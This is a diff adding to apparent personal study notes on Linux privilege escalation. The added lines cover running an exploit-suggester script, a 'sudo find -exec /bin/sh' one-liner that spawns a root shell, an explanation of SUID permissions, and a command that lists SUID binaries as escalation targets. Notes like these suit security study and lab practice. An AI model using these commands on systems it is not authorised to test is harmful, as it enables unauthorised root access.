@@ -12,3 +12,26 @@ download the file
 give permission
 run
 cmd: ./linux exploit suggester.sh
+
+
+2.1) SUDO
+cmd:
+sudo find . -exec /bin/sh \; -quit
+
+2.2) SUID
+Definition: SUID (Set owner User ID up on execution) is a special permission that allows other users run with the owner’s privileges. 
+That’s why SUID files can be exploited to give adversaries the higher privilege in Linux/Unix system called privilege escalation. 
+Mostly, root access is the goal of hackers when performing privilege escalation.
+
+SUID will be set by adding number 4 in the permission number when using chmod command. 
+For example: 4777, 4600, 4500, 4000, etc.
+
+cmd: sudo chmod 4777 demo_file
+
+Note: Letter s or S in the permission both represent for the SUID file. 
+They only switch to one another when the execute permission is set.
+
+Find the SUID files
+The following command will list all of the SUID files in the system
+
+find / -perm -u=s -type f 2>/dev/null
